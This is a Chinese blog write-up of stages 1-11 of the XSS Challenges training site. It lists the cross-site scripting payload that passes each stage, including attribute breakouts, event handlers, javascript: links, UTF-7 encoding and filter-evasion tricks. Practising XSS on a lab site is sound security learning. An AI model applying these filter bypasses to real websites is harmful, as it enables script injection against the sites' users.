---
title: XSS Challenges 靶场训练（1-11关）
date: '2019-08-09 14:22:30'
tags:
- web安全
- XSS
---

> #### 靶场地址

[XSS Challenges (by yamagata21) - Stage #1](https://xss-quiz.int21h.jp)

<!--more-->

> #### 第一关

没什么可说的，直接插入JS代码：

```
<script>alert(document.domain)</script>
```

> #### 第二关

要先将input标签完结
```
"><script>alert(document.domain)</script>
```

> #### 第三关

在选择国家处，F12把国家名修改成```<script>alert(document.domain)</script>```

> #### 第四关

看源码发现有一个隐藏的输入框，抓包注入代码进输入框里的value值：

![48bced01.png](48bced01.png)

> #### 第五关

输入框有前端验证的字数限制，抓包绕过：

![acd0755f.png](acd0755f.png)

> #### 第六关

输入之前的payload，发现尖括号被转义为HTML实体编码：

![75e56454.png](75e56454.png)

查看提示说使用JS事件：

~~~
" onmouseover=alert(document.domain) "
~~~

注入成功，鼠标每划过输入框都会弹窗，当然事件也可以选其他的，比如onclick

> #### 第七关

额...用上一关的payload依然通过了，不知道发生了什么...

> #### 第八关

这一关要将XSS代码注入a标签的href属性值中，使用如下payload：

~~~
javascript:alert(document.domain)
~~~

点击生成的链接就能弹窗

> #### 第九关

使用UTF-7 XSS。抓包把post的数据改为

~~~
p1=a%2BACI++onmouseover%2BAD0AIg-javascript%3Aalert%28document.domain%29%2BACI++id%2BAD0AIg-x&charset=UTF-7
~~~

该方法要求浏览器能解析UTF-7，在Firefox 68.0.1 (64 位)上没有成功，在IE 11成功了。

至于原理没有认真学习，就不在这误人子弟了哈...

> #### 第十关

测试发现，网站会把domain过滤掉，输入domdomainain，这样过滤后又是domain

~~~
"><script>alert(document.domdomainain)</script>
~~~

> #### 第十一关

测试发现网站把script标签过滤为xscript，onclick之类的过滤为onxxx

列举一些尝试过的payload：

~~~
"><IMG SRC="javasc ript:alert(document.domain)">
"><IMG SRC="javasc\0ript:alert(document.domain)">
"><IMG SRC="javasc&#09;ript:alert(document.domain)">
"><a href="javascr ipt:alert(document.domain)">a</a>
"><a href="javascRiPt:alert(document.domain)">a</a>
~~~

最终成功的是下面的这个payload。其中```&#09;```是空格的html实体编码：

~~~
"><a href="javascr&#09;ipt:alert(document.domain)">a</a>
~~~
